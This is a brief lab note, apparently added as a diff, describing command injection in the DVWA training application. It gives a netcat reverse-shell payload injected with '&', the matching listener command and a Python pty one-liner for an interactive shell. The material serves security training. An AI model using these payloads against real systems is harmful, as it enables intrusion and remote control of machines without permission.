@@ -1,0 +1,18 @@
+
+In dvwa, Command injection/execution, 
+
+If We type: & nc <listener ip> <port> -e /bin/bash
+
+we Will get a shell: nc -nlvp <port>
+
+--->
+
+(NOTE: We will not get a interactive shell)
+
+With python: python -c "import pty; pty.spawn('/bin/bash')"
+
+
+There are many ways you can make your shell interactive if Python is not installed.
+
+see: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys
+
